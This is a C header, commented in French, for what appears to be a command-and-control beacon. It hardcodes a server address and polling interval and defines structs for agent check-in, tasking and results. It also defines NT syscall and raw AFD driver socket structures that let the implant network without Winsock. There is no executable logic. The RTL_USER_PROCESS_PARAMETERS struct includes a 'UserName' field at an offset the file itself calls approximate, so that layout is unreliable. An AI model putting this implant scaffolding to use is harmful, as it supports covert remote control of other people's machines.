/*
 * types.h - Structures de données du beacon
 */

#ifndef TYPES_H
#define TYPES_H

#include <windows.h>

// Configuration
#define SERVER_IP       "192.168.18.24"
#define SERVER_PORT     8000
#define SLEEP_TIME_MS   5000

// Tailles des buffers
#define UUID_SIZE       64
#define SMALL_BUF       128
#define MEDIUM_BUF      1024
#define LARGE_BUF       8192

// Structures
typedef struct {
    char agent_id[UUID_SIZE];
    char username[SMALL_BUF];
    char hostname[SMALL_BUF];
    char internal_ip[16];
    char os_version[SMALL_BUF];
} AgentInfo;

typedef struct {
    int task_id;
    char command[MEDIUM_BUF];
} TaskResponse;

typedef struct {
    char agent_id[UUID_SIZE];
    int task_id;
    char result[LARGE_BUF];
    int success;
} TaskResult;

typedef struct {
    int status_code;
    char body[LARGE_BUF];
    DWORD body_length;
} HttpResponse;

// ═══════════════════════════════════════════════════════════════
// Structures NT/Syscalls
// ═══════════════════════════════════════════════════════════════

// UNICODE_STRING
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// IO_STATUS_BLOCK
typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// LARGE_INTEGER (si pas déjà défini)
#ifndef _LARGE_INTEGER_DEFINED
#define _LARGE_INTEGER_DEFINED
typedef union _LARGE_INTEGER {
    struct {
        DWORD LowPart;
        LONG HighPart;
    };
    struct {
        DWORD LowPart;
        LONG HighPart;
    } u;
    LONGLONG QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;
#endif

// Macros NT
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// ═══════════════════════════════════════════════════════════════
// Structures AFD
// ═══════════════════════════════════════════════════════════════

// IOCTL codes pour AFD driver
#define IOCTL_AFD_BIND              0x12003
#define IOCTL_AFD_CONNECT           0x12007
#define IOCTL_AFD_SEND              0x1201F
#define IOCTL_AFD_RECV              0x12017
#define IOCTL_AFD_DISCONNECT        0x1200B
#define IOCTL_AFD_GET_SOCK_NAME     0x1200F

// Socket constants
#define AF_INET 2
#define AFD_OVERLAPPED 0x00000002
#define TDI_RECEIVE_NORMAL 0x00000000

// AFD_WSABUF (équivalent WSABUF)
typedef struct _AFD_WSABUF {
    ULONG len;
    PCHAR buf;
} AFD_WSABUF, *PAFD_WSABUF;

// AFD_SEND_INFO
typedef struct _AFD_SEND_INFO {
    PAFD_WSABUF BufferArray;
    ULONG BufferCount;
    ULONG AfdFlags;
    ULONG TdiFlags;
} AFD_SEND_INFO, *PAFD_SEND_INFO;

// AFD_RECV_INFO
typedef struct _AFD_RECV_INFO {
    PAFD_WSABUF BufferArray;
    ULONG BufferCount;
    ULONG AfdFlags;
    ULONG TdiFlags;
} AFD_RECV_INFO, *PAFD_RECV_INFO;

// AFD_SOCKADDR_IN (renommé pour éviter conflit avec winsock.h)
typedef struct _AFD_SOCKADDR_IN {
    SHORT sin_family;
    USHORT sin_port;
    ULONG sin_addr;
    CHAR sin_zero[8];
} AFD_SOCKADDR_IN, *PAFD_SOCKADDR_IN;

// ═══════════════════════════════════════════════════════════════
// Structures PEB (Process Environment Block) pour sysinfo
// ═══════════════════════════════════════════════════════════════

// RTL_USER_PROCESS_PARAMETERS (simplifié - seulement les champs nécessaires)
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;
    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;
    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    BYTE Reserved3[256];
    UNICODE_STRING CurrentDirectory;
    HANDLE CurrentDirectoryHandle;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImageFileName;
    UNICODE_STRING Environment2;
    BYTE Reserved4[68];
    UNICODE_STRING UserName;  // Offset approximatif - ce qu'on veut
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// PEB (simplifié - seulement ProcessParameters)
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    // ... reste omis, on a ce qu'il faut
} PEB, *PPEB;

// KEY_VALUE_PARTIAL_INFORMATION (pour lire le registre)
typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataLength;
    UCHAR Data[1];
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

// SYSTEM_BASIC_INFORMATION (pour version OS)
typedef struct _SYSTEM_BASIC_INFORMATION {
    ULONG Reserved;
    ULONG TimerResolution;
    ULONG PageSize;
    ULONG NumberOfPhysicalPages;
    ULONG LowestPhysicalPageNumber;
    ULONG HighestPhysicalPageNumber;
    ULONG AllocationGranularity;
    ULONG_PTR MinimumUserModeAddress;
    ULONG_PTR MaximumUserModeAddress;
    ULONG_PTR ActiveProcessorsAffinityMask;
    CCHAR NumberOfProcessors;
} SYSTEM_BASIC_INFORMATION, *PSYSTEM_BASIC_INFORMATION;

#endif
